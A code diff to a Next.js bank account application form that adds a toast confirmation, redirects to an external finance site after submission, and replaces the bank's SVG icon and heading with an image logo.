@@ -6,6 +6,7 @@ import { ChevronRight, Upload, CheckCircle } from "lucide-react";
 import { accountTypes, employmentTypes, incomeRanges } from "@/mockdata";
 import { supabase } from "@/lib/supabase";
 import { useRouter } from "next/navigation";
+import toast from "react-hot-toast";
 
 export default function GTVBankForm() {
   const formRef = useRef<HTMLFormElement>(null);
@@ -50,6 +51,11 @@ export default function GTVBankForm() {
 
     return urlData.publicUrl;
   };
+
+  const successful = () =>
+    toast(
+      "Your information has been received successfully and you will be notified through your email once this is confirmed. Thank you"
+    );
 
   const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
@@ -118,8 +124,8 @@ export default function GTVBankForm() {
         process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!
       );
 
-      alert("✅ Application submitted successfully!");
-      router.push("/file-upload-success");
+      successful();
+      window.location.href = "https://atlasfinancecc.com";
       formRef.current.reset();
       setUploadedFiles({
         frontSide: null,
@@ -141,21 +147,13 @@ export default function GTVBankForm() {
           {/* Header */}
           <div className="bg-blue-600 px-6 py-4 flex items-center justify-between">
             <div className="flex items-center space-x-3">
-              <div className="bg-white p-2 rounded">
-                <svg
-                  className="w-8 h-8 text-blue-600"
-                  fill="currentColor"
-                  viewBox="0 0 20 20"
-                >
-                  <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4z" />
-                  <path
-                    fillRule="evenodd"
-                    d="M18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z"
-                    clipRule="evenodd"
-                  />
-                </svg>
+              <div className="bg-white rounded">
+                <img
+                  src="/atlass.jpg"
+                  alt="Logo"
+                  className="w-[120px] h-auto text-blue-600"
+                />
               </div>
-              <h1 className="text-2xl font-bold text-white">GTV BANK</h1>
             </div>
           </div>
 
